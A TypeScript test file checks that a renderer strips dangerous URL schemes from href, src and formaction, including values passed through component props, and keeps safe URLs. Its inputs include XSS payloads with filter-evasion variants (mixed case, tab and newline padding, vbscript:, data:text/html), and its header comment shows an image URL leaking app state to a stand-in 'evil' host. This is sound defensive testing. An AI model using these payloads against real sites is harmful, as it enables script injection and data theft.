/**
 * URL scheme sanitization.
 *
 * The renderer already refuses to emit `<script>` and friends, but nothing
 * checked where a URL attribute pointed. `<a href="javascript:…">` gave a
 * bundle arbitrary code on the host origin — where every *other* app's storage
 * lives — for the price of one click, and `<img src="https://evil/?d={state}">`
 * exfiltrated with no click and no `net` grant.
 */

import React from 'react';
import { describe, it, expect } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { parse } from '../src/parser';
import { renderDocument, ComponentRegistry } from '../src/renderer';
import type { SoftNRenderContext } from '../src/types';

function html(
  source: string,
  state: Record<string, unknown> = {},
  registry = new ComponentRegistry()
): string {
  const doc = parse(source);
  const context = {
    state,
    setState: () => {},
    data: {},
    functions: {},
    computed: {},
  } as unknown as SoftNRenderContext;
  return renderToStaticMarkup(
    React.createElement(React.Fragment, null, renderDocument(doc, context, registry))
  );
}

describe('schemes that execute', () => {
  it('drops javascript: from href', () => {
    const out = html('<a href="javascript:alert(1)">Continue</a>');
    expect(out).not.toContain('javascript:');
    expect(out).toContain('Continue');
  });

  it('drops it regardless of case', () => {
    expect(html('<a href="JaVaScRiPt:alert(1)">x</a>')).not.toMatch(/javascript:/i);
  });

  it('drops it when padded with characters the browser ignores', () => {
    // A leading tab, newline or NUL is stripped by the URL parser, so a naive
    // `startsWith('javascript:')` check misses these.
    expect(html('<a href=" \tjavascript:alert(1)">x</a>')).not.toMatch(/javascript:/i);
    expect(html('<a href="java\nscript:alert(1)">x</a>')).not.toMatch(/script:/i);
  });

  it('drops vbscript: and data:text/html', () => {
    expect(html('<a href="vbscript:msgbox(1)">x</a>')).not.toContain('vbscript:');
    expect(html('<a href="data:text/html,<script>alert(1)</script>">x</a>')).not.toContain(
      'data:text/html'
    );
  });

  it('covers src and formaction too, not just href', () => {
    expect(html('<img src="javascript:alert(1)"/>')).not.toContain('javascript:');
    expect(html('<button formaction="javascript:alert(1)">x</button>')).not.toContain(
      'javascript:'
    );
  });

  it('drops a scheme arriving through an expression, not just a literal', () => {
    const out = html('<a href={link}>x</a>', { link: 'javascript:alert(1)' });
    expect(out).not.toContain('javascript:');
  });
});

describe('URLs apps legitimately use', () => {
  it('keeps http and https', () => {
    expect(html('<a href="https://example.com/docs">x</a>')).toContain('https://example.com/docs');
    expect(html('<a href="http://192.168.1.4:8080/">x</a>')).toContain('http://192.168.1.4:8080/');
  });

  it('keeps relative paths, fragments and queries', () => {
    expect(html('<a href="/settings">x</a>')).toContain('href="/settings"');
    expect(html('<a href="./img.png">x</a>')).toContain('./img.png');
    expect(html('<a href="#top">x</a>')).toContain('href="#top"');
  });

  it('keeps mailto and tel', () => {
    expect(html('<a href="mailto:hi@example.com">x</a>')).toContain('mailto:');
    expect(html('<a href="tel:+61400000000">x</a>')).toContain('tel:');
  });

  it('keeps blob: URLs, which is what asset() returns', () => {
    const out = html('<img src={u}/>', { u: 'blob:http://localhost:1420/abc-123' });
    expect(out).toContain('blob:');
  });

  it('keeps inline media data URLs', () => {
    // Demo bundles pass captured photos and bundled audio this way.
    const png = 'data:image/png;base64,iVBORw0KGgo=';
    expect(html('<img src={u}/>', { u: png })).toContain('data:image/png');
    expect(html('<audio src={u}/>', { u: 'data:audio/wav;base64,UklGRg==' })).toContain(
      'data:audio/wav'
    );
  });
});

/** The <Breadcrumb> shape: a component that forwards a nested href to an <a>. */
const MockTrail: React.FC<{ items?: { label: string; href?: string }[] }> = ({ items = [] }) => (
  <nav>
    {items.map((item, i) => (
      <a key={i} href={item.href}>
        {item.label}
      </a>
    ))}
  </nav>
);

const MockPic: React.FC<{ src?: string }> = ({ src }) => <img src={src} />;

/** A component whose `data` and `action` are not URLs, which is the common case. */
const MockPlot: React.FC<{ data?: unknown; action?: unknown }> = ({ data, action }) => (
  <figure>
    {JSON.stringify(data)}
    {String(action)}
  </figure>
);

describe('registered components', () => {
  // The check used to run only for intrinsic tags, on the reasoning that a
  // component decides for itself what to do with its props. <Breadcrumb> does
  // not decide — it puts `item.href` straight into an <a> — so a bundle got a
  // javascript: URL onto the page through a component the same way it once did
  // through a raw <a>.
  function withComponents(): ComponentRegistry {
    const registry = new ComponentRegistry();
    registry.register('Trail', MockTrail);
    registry.register('Pic', MockPic);
    registry.register('Plot', MockPlot);
    return registry;
  }

  it('drops a scheme from a direct prop', () => {
    expect(html('<Pic src="javascript:alert(1)"/>', {}, withComponents())).not.toContain(
      'javascript:'
    );
  });

  it('drops one nested inside an array-of-objects prop', () => {
    const out = html('<Trail items={crumbs}/>', {
      crumbs: [{ label: 'Home', href: 'javascript:alert(1)' }, { label: 'Now' }],
    }, withComponents());
    expect(out).not.toContain('javascript:');
    expect(out).toContain('Home');
  });

  it('keeps the safe entries of the same array', () => {
    const out = html('<Trail items={crumbs}/>', {
      crumbs: [
        { label: 'Home', href: '/' },
        { label: 'Docs', href: 'https://example.com/docs' },
        { label: 'Now', href: 'javascript:alert(1)' },
      ],
    }, withComponents());
    expect(out).toContain('href="/"');
    expect(out).toContain('https://example.com/docs');
    expect(out).not.toContain('javascript:');
  });

  it('leaves the app state it scrubbed from untouched', () => {
    // The array reaching a component is the app's own state, so the scrub has
    // to copy rather than delete in place.
    const crumbs = [{ label: 'Home', href: 'javascript:alert(1)' }];
    html('<Trail items={crumbs}/>', { crumbs }, withComponents());
    expect(crumbs[0].href).toBe('javascript:alert(1)');
  });

  it('leaves non-URL props alone even when HTML uses the name for a URL', () => {
    // `data` and `action` are URL attributes on <object> and <form>, but on a
    // component they are the rows a chart plots and the node it renders — so
    // they are judged by neither name nor scheme.
    const out = html('<Plot data={rows} action="Note: retry"/>', {
      rows: [{ x: 1 }],
    }, withComponents());
    expect(out).toContain('x&quot;:1');
    expect(out).toContain('Note: retry');
  });
});

describe('void HTML elements', () => {
  // React rejects the children argument for these outright, and the renderer
  // passed the empty array it builds for every element — so any `.ui` using a
  // plain `<img>` or `<br>` crashed. The demos only reach them through wrapper
  // components like <Image>, which is why nothing caught it.
  it('render instead of throwing', () => {
    expect(html('<img src="/logo.png"/>')).toContain('/logo.png');
    expect(html('<br/>')).toContain('<br');
    expect(html('<hr/>')).toContain('<hr');
    expect(html('<input type="text"/>')).toContain('<input');
  });

  it('still render their non-void neighbours with children', () => {
    expect(html('<div><span>hi</span></div>')).toContain('<span>hi</span>');
  });
});
